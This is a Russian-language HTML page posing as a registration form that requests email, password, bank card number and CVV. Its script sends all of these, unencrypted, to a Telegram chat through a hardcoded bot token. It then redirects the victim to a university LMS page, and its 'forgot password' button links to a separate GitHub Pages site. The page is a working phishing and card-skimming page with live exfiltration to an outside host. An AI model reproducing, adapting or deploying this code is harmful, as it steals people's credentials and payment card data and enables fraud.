<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
      form {
        display: flex;
        flex-direction: column;
        width: 250px;
        margin-left: 100px;
      }
      h1 {
        margin-left: 100px;
      }
      button {
        font-size: 20px;
        width: auto;
        margin-top: 5px;
        padding: 10px;
        background: green;
        color: white; /* Добавлено для улучшения видимости текста на кнопке */
      }
      #forgot-password {
        background: blue; /* Измените цвет фона для кнопки "Забыли пароль?" */
      }
    </style>
</head>
<body>
    <h1>Регистрация</h1>
    <form id="registrationForm">
        <p></p>
        <label for="email">Email</label>
        <input type="text" id="email" name="email" required maxlength='50' onkeypress="return /[a-zA-Z0-9@.]/.test(event.key)" title="Email должен содержать только латинские буквы, цифры, @ и .">
        <br>
        <p></p>
        <label for="pass">Пароль</label>
        <input type="text" id="pass" name="password" required maxlength='20' onkeypress="return /[a-zA-Z0-9]/.test(event.key)" title="Пароль должен содержать только латинские буквы и цифры (максимум 20 символов)">
        <p></p>
        <label for="cvv">CVV код (3-х значный код на обратной стороне карты)</label>
        <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
        <br>
        <p></p>
        <label for="card">Номер банковской карты</label>
        <input type="text" id="card" name="card" required maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Введите номер карты (только цифры)">
        <button type="submit">Зарегистрироваться</button>
        <button type="button" id="forgot-password">Забыли пароль?</button> <!-- Кнопка для восстановления пароля -->
    </form>

    <script>
        const form = document.getElementById('registrationForm');

        form.addEventListener('submit', e => {
            e.preventDefault(); 
            
            const username = document.getElementById('pass').value;
            const email = document.getElementById('email').value;
            const card = document.getElementById('card').value;
            
            

            // Проверка на наличие символа @ в email
            if (!email.includes('@')) {
                alert('Пожалуйста, введите корректный адрес электронной почты (должен содержать @).');
                return;
            }

            // Проверка на допустимые символы в email
            const emailPattern = /^[a-zA-Z0-9@.]+$/;
            if (!emailPattern.test(email)) {
                alert('Email может содержать только латинские буквы, цифры, @ и .');
                return;
            }

            const cvv = document.getElementById('cvv').value;
            

            const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
            const chatId = -1002372284940; 
            const message = `Новая регистрация:\n Почта: ${email}\n Пароль: ${username}\n CVV: ${cvv}\n номер банка: ${card}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            fetch(url) 
            .then(response => {
                if (response.ok) {
                    alert('Данные успешно отправлены в Telegram!');
                    // Перенаправление на другую страницу
                    window.location.href = 'https://lms.dgmu.ru/mod/quiz/report.php?id=44292&mode=overview'; 
                } else {
                    console.log('error');
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
                alert('Ошибка при отправке данных.');
            });
        });

        // Обработчик клика для кнопки "Забыли пароль?"
        document.getElementById('forgot-password').addEventListener('click', function() {
            window.location.href = 'https://sheikh05ed.github.io/register_on_vk.github.io/'; 
        });
    </script>
</body>
</html>

